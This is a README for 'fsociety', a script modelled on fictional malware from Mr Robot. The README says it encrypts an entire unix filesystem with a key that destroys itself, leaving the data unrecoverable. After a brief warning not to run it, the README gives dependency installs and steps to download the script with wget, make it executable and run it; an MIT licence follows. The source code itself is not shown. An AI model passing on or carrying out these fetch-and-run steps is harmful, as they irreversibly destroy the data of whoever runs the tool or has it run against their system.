# fsociety
__WARNING: do not actually execute this. You will not be able to recover the files.__

This is intended to encrypt every bit of data in a unix filesystem using 256-bit AES with 
a self-destructing, randomly generated key.

The [fuxsocy.py](https://i.imgur.com/tAvWBe6.jpg) script is based on Darlene's malware [shown](https://gifyu.com/images/ezgif.com-video-to-giff0eda.gif) in Mr Robot

## [S2E1](https://gifyu.com/images/ezgif.com-video-to-giff0eda.gif):
![alt-text](https://i.imgur.com/6RIogYa.jpg)

### Dependencies:

* python
* pycrypto

```shell
sudo apt install python python-pip
```
```shell
sudo pip install pycrypto
```

### Usage:

```shell
wget https://raw.githubusercontent.com/joekendal/fsociety/master/fuxsocy.py
```
```shell
sudo chmod +x fuxsocy.py
```
```shell
./fuxsocy.py
```

### MIT

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

